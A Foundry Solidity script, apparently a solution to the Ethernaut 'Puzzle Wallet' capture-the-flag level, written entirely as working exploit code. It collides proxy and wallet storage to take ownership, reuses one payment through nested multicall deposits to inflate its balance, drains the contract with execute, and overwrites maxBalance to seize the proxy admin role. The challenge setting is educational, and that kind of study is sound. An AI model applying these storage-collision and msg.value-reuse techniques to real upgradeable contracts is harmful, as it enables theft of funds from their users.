// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/24_PuzzleWallet.sol";

contract ExploitScript is Script {
    PuzzleProxy level24Proxy = PuzzleProxy(payable(0x5bCf4eC7D87D3F0Ef2102423917bDd8AeA560DA8));
    PuzzleWallet level24Wallet = PuzzleWallet(payable(0x5bCf4eC7D87D3F0Ef2102423917bDd8AeA560DA8));
    
    function run() external {
        vm.startBroadcast();

        level24Proxy.proposeNewAdmin(msg.sender);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(level24Wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(level24Wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(level24Wallet.multicall.selector, depositSelector);
        level24Wallet.addToWhitelist(msg.sender);
        level24Wallet.multicall{value: 0.001 ether}(nestedMulticall);
        level24Wallet.execute(msg.sender, 0.002 ether, "");
        level24Wallet.setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}
